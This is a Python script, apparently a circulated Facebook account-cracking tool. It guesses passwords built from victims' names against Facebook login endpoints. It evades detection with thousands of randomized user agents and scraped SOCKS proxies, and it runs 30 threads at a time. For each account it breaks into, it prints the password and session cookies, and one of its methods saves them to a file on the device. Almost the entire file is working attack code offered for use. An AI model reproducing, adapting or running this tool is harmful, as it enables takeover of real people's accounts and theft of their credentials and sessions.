import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import urllib3
import rich
import bs4
from concurrent.futures import ThreadPoolExecutor
#---------------------
id = []
id2 = []
loop = 0
ok = 0
cp = 0
akun = []
method = []
tokenku = []
uid = []
ugen2=[]
ugen=[]
pws=[]
pws2=[]
#-------------------------------------------
#-------------------------------------------
for xd in range(199999):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
#-------------------------------------------
	aa='Mozilla/5.0 (Linux; Android 5.1; Power Rage Build/LMY47I; wv)'
	b=random.choice(['2','3','4','5','6','7','8','9','10','11','12','13','14','15'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
#-------------------------------------------
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','9','10','11','12','13','14','15'])
	c='Infinix X678B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,114)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,190)
	h='Mobile Safari/537.36'
	ua=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(ua)
#-------------------------------------------
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','9','10','11','12','13','14','15'])
	c='Infinix X6833B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,114)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,190)
	h='Mobile Safari/537.36'
	ua=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(ua)
#-------------------------------------------
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','9','10','11','12','13','14','15'])
	c='Infinix X6831 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,114)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,190)
	h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/421.0.0.33.47;]'
	ua=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(ua)
#-------------------------------------------
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','9','10','11','12','13','14','15'])
	c='K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=random.randrange(40,114)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,190)
	h='Mobile Safari/537.36'
	ua=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(ua)
#-------------------------------------------
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[ + ] ERROR')
#-------------------------------------------
def clear():
	os.system('clear')
#-------------------------------------------
def back():
	login()
#-------------------------------------------
def slow(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
#-------------------------------------------
logo='''
\033[36;1m ----------------------------------------------------
\033[32;1m Ø§Ø¯Ø§Ù‡ Ù„ÙŠØ³Øª Ù„Ù„Ø¨ÙŠØ¹ ðŸ–ï¸ : \033[0;1m Tool is not for sale
\033[32;1m Telegram : \033[0;1m https://t.me/sosrond
\033[32;1m VERSION : \033[0;1m TOOL 2022
\033[36;1m ----------------------------------------------------
'''
#-------------------------------------------

#-------------------------------------------
def login():
	slow('\033[10;92m\033[1;97m=============================================')
	print('\033[10;92m\033[10;97m[\033[10;92m1\033[10;97m]\033[10;92m FILE CLONING\n\033[10;92m\033[10;97m[\033[10;92m2\033[10;97m] \033[10;93mCONTACT WITH ADMIN\n\033[10;92m\033[10;97m[\033[10;92m0\033[10;97m] \033[1;91mEXIT ')
	slow('\033[10;92m\033[1;97m=============================================')
	select = input('\033[10;92m\033[10;92m\033[10;97m[\033[10;92m+\033[10;97m] \033[10;92mCHOOSE \033[10;91m\033[10;92m ');time.sleep(0.01)
	if select in ['m']:
		public()
	elif select in ['1']:
		crack_file()
	elif select in ['i','0i']:
		result()
	elif select in ['2','02']:
		os.system('xdg-open url')
	elif select in ['0']:
		exit()
	else:
		slow('  \033[10;97m[\033[10;92m?\033[10;97m] \033[10;91mINPUT WRONG-!╤В╨н╨Ь')
		time.sleep(2)
		back()
#-------------------------------------------
def crack_file():
	os.system('clear')
	print('\033[10;92m\033[1;32m\033[10;97m[\033[10;92m+\033[10;97m] [EXAMPLE \033[10;91m \033[10;92m/sdcard/File.txt  Etc...]')

	o = input('\033[10;92m\033[10;97m[\033[10;92m+\033[10;97m]\x1b[38;5;208m YOUR FILE NAME \033[10;91m\033[10;92m ')
	try:lin = open(o).read().splitlines()
	except:
		slow('\033[10;97m[\033[10;92m?\033[10;97m] \033[10;91mFile Not Found')
		time.sleep(2)
		back()
	for xid in lin:
		id.append(xid)
	setting()	
#-------------------------------------------
def setting():
	hu = '3'
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	os.system('clear')
	print(logo)
	print('[ 1 ] METHOD ( B-API )\n[ 2 ] METHOD ( FREE )\n[ 3 ] METHOD ( MBASIC )\n[ 4 ] METHOD ( MOBILE )')
	hc = input('\n[ + ] CHOOSE: ')
	if hc in ['1','01']:
		method.append('bapi')
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('mbasic')
	elif hc in ['4','04']:
		method.append('mobile')
	else:
		method.append('bapi')
	passwrd()
def passwrd():
	os.system('clear')
	print(logo)
	print('\033[0;1m[ \033[31;1m+ \033[0;1m] TOTAL IDS: \033[32m'+str(len(id)))
	print('\033[0;1m[ \033[31;1m+ \033[0;1m] CLONING HAS BEEN STARTED')
	print('\033[0;1m[ \033[31;1m+ \033[0;1m] TO STOP THE TOOL ( CTRL+Z )')
	print('-------------------------------------------')
	with ThreadPoolExecutor(max_workers=30) as xoshnaw:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'1')
					pwv.append(frs+'11')
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(nmf)
					pwv.append(frs+'168')
					pwv.append(frs+'@')
					pwv.append(frs+'@@')
					pwv.append(frs+'@@@')
					pwv.append(frs+'@@@@')
					pwv.append(frs+'@123')
					pwv.append(frs+'@12')
					pwv.append(frs+'@#')
					pwv.append(frs+'@@##')
					pwv.append(frs+'@#123')
					pwv.append(frs+'143')
					pwv.append(frs+'111')
					pwv.append(frs+'1122')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(frs+'1')
					pwv.append(frs+'11')
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(nmf)
					pwv.append(frs+'168')
					pwv.append(frs+'@')
					pwv.append(frs+'@@')
					pwv.append(frs+'@@@')
					pwv.append(frs+'@@@@')
					pwv.append(frs+'@123')
					pwv.append(frs+'@12')
					pwv.append(frs+'@#')
					pwv.append(frs+'@@##')
					pwv.append(frs+'@#123')
					pwv.append(frs+'143')
					pwv.append(frs+'111')
					pwv.append(frs+'1122')
			if 'bapi' in method:
				xoshnaw.submit(crack,idf,pwv)
			elif 'free' in method:
				xoshnaw.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				xoshnaw.submit(crackmbasic,idf,pwv)
			elif 'mobile' in method:
				xoshnaw.submit(crackmobile,idf,pwv)
			else:
				xoshnaw.submit(crackmbasic,idf,pwv)
	print('\n')
	print('\033[0;1m[ \033[31;1m+ \033[0;1m] CRACK TAWAW BU')
	print('\033[0;1m[ \033[31;1m+ \033[0;1m] ENTER TO MENU')
	meno = input('\033[0;1m[ \033[31;1m+ \033[0;1m] CHOOSE: ');menu()
	
#-------------------------------------------
def menu():
	os.system('clear')
	print(logo)
	print('\033[0;1m[ \033[31;1m1 \033[0;1m] FILE CLONING')
	xoshnaw = input('\n\033[0;1m[ \033[31;1m+ \033[0;1m] CHOICE: ')
	if xoshnaw in ['1','01']:
		crack_file()
	elif xoshnaw in ['0','00']:
		os.system("rm -f cookies.txt")
		exit()
	else:
		exit()
#-------------------------------------------
def crack(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\033[0;1m[ \033[34;1m{loop}:{len(id)} \033[0;1m]  \033[0;1m[ \033[32;1m{ok} \033[0;1m]  \033[0;1m[ \033[33;1m{cp} \033[0;1m]"),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(idf)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
			if "session_key" in send.text and "EAAA" in send.text and "c_user" in send.text:
				print('\n')
				print(f'\033[32;1m[ + ] OK:\n[ + ] ID: {idf}\n[ + ] PASS: {pw}')
				ok+=1
				break
				continue
			elif "www.facebook.com" in send.json()["error_msg"]:
				print('\n')
				print(f'\033[33;1m[ + ] CP:\n[ + ] ID: {idf}\n[ + ] PASS: {pw}')
				cp+=1
				break
				continue

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(91)
	loop+=1

#-------------------------------------------
def crackmobile(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\033[0;1m[ \033[34;1m{loop}:{len(id)} \033[0;1m]  \033[0;1m[ \033[32;1m{ok} \033[0;1m]  \033[0;1m[ \033[33;1m{cp} \033[0;1m]"),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://x.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('\n')
				print(f'\033[33;1m[ + ] CP:\n[ + ] ID: {idf}\n[ + ] PASS: {pw}')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print('\n')
				print(f'\033[32;1m[ + ] OK:\n[ + ] ID: {idf}\n[ + ] PASS: {pw}\n[ + ] COOKIE: {kuki}')
				open('/sdcard/real.txt', 'a').write(idf+' | '+pw+'\n[COOKIES] тЧП '+kuki+'\n[AGENT] тЧП '+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(91)
	loop+=1


#-------------------------------------------
def crackfree(idf,pwv):
	global loop,ok,cp
	l = loop*100/len(id2)
	o = '%'
	prox=open('.prox.txt','r').read().splitlines()
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r[ %s : %s ]  [ %s ]  [ %s ]'%(loop,len(id2),ok,cp));sys.stdout.flush()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('\n')
				print(f'\033[33;1m[ + ] CP:\n[ + ] ID: {idf}\n[ + ] PASS: {pw}')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print('\n')
				print(f'\033[32;1m[ + ] OK:\n[ + ] ID: {idf}\n[ + ] PASS: {pw}\n[ + ] COOKIE: {kuki}')
				break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(91)
	loop+=1

#-------------------------------------------
def crackmbasic(idf,pwv):
	global loop,ok,cp
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r[ %s : %s ]  [ %s ]  [ %s ]'%(loop,len(id2),ok,cp));sys.stdout.flush()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('\n')
				print(f'\033[33;1m[ + ] CP:\n[ + ] ID: {idf}\n[ + ] PASS: {pw}')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print('\n')
				print(f'[ + ] ID: {idf}\n[ + ] PASS: {pw}\n[ + ] COOKIE: {kuki}')
				
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(91)
	loop+=1

#-------------------------------------------
if __name__=='__main__':
	try:os.system('touch proxyy.txt')
	except:pass
	login()

